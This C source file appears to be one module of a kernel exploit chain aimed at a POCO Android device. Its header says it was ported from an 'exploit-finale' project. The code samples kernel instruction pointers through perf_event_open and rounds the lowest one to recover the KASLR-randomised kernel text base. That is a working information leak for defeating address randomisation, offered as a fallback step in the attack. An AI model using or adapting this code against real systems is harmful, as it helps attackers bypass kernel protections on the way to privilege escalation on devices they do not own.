/*
 * kaslr_perf.c — KASLR text base via perf kernel-IP sampling (FALLBACK).
 *
 * Ported from exploit-finale/src/kaslr_perf.c. Used as a fallback when the
 * tracefs sched_blocked_reason leak fails to capture the workqueue worker
 * (environmental flakiness). On POCO perf_event_paranoid=-1 so unprivileged
 * kernel sampling is allowed.
 *
 * Method: PERF_COUNT_SW_CPU_CLOCK with kernel samples; the lowest kernel-text
 * IP, rounded to 2 MiB, yields _text. For POCO P0_KERNEL_PHYS_DELTA == 0, so
 * the 2 MiB-rounded address IS the KASLR-slid _text (GKI KASLR slide is itself
 * 2 MiB-aligned, e.g. 0x20c7200000).
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

#include "common.h"

#ifndef PERF_LEAK_ALIGN
#define PERF_LEAK_ALIGN 0x200000ULL
#endif
#ifndef PERF_LEAK_MMAP_PAGES
#define PERF_LEAK_MMAP_PAGES 8
#endif

uint64_t perf_leak_text_base(void) {
  /* perf_event_paranoid > 1 blocks kernel samples for unprivileged callers. */
  int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
  if (pfd >= 0) {
    char pbuf[16];
    ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1);
    close(pfd);
    if (pn > 0) {
      pbuf[pn] = 0;
      if (atoi(pbuf) > 1) {
        pr_warning("perf text-base perf_event_paranoid too high\n");
        return 0;
      }
    }
  }

  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 1;
  pe.sample_type = PERF_SAMPLE_IP;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.disabled = 1;
  pe.wakeup_events = 1;

  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pe.sample_period = 100000;
    fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  }
  if (fd < 0) {
    pr_warning("perf text-base perf_event_open errno=%d\n", errno);
    return 0;
  }

  size_t mmap_size = (size_t)(1 + PERF_LEAK_MMAP_PAGES) * (size_t)PAGE_SIZE;
  void *mmap_buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd, 0);
  if (mmap_buf == MAP_FAILED) {
    pr_warning("perf text-base mmap errno=%d\n", errno);
    close(fd);
    return 0;
  }

  struct perf_event_mmap_page *header =
      (struct perf_event_mmap_page *)mmap_buf;
  uint64_t min_kip = ~(uint64_t)0;
  int kernel_samples = 0;

  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

  for (volatile long i = 0; i < 500000; i++) {
    if ((i % 10000) == 0) {
      sched_yield();
    }
  }

  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  uint64_t data_tail = header->data_tail;
  uint64_t data_head = header->data_head;
  __sync_synchronize();
  uint64_t data_size = (uint64_t)PERF_LEAK_MMAP_PAGES * (uint64_t)PAGE_SIZE;
  uint8_t *base = (uint8_t *)mmap_buf + PAGE_SIZE;

  while (data_tail < data_head) {
    struct perf_event_header *ev =
        (struct perf_event_header *)(base + (data_tail % data_size));
    if (ev->size == 0) {
      break;
    }
    if (data_tail + ev->size > data_head) {
      break;
    }
    if (ev->type == PERF_RECORD_SAMPLE &&
        (ev->misc & PERF_RECORD_MISC_KERNEL)) {
      uint64_t ip = *(uint64_t *)((uint8_t *)ev + sizeof(*ev));
      /* keep kernel-text IPs only, drop module IPs (< KIMAGE_TEXT_BASE) */
      if (ip >= KIMAGE_TEXT_BASE && ip < min_kip) {
        min_kip = ip;
      }
      kernel_samples++;
    }
    data_tail += ev->size;
  }
  header->data_tail = data_tail;

  munmap(mmap_buf, mmap_size);
  close(fd);

  if (kernel_samples == 0 || min_kip == ~(uint64_t)0) {
    pr_warning("perf text-base no kernel samples collected\n");
    return 0;
  }

  uint64_t text_base =
      (min_kip & ~(PERF_LEAK_ALIGN - 1)) + P0_KERNEL_PHYS_DELTA;
  if (text_base < KIMAGE_TEXT_BASE) {
    pr_warning("perf text-base out of range: %016llx\n",
               (unsigned long long)text_base);
    return 0;
  }
  pr_success("perf text-base pid=%d samples=%d min_kip=%016llx "
             "text_base=%016llx\n",
             getpid(), kernel_samples, (unsigned long long)min_kip,
             (unsigned long long)text_base);
  return text_base;
}
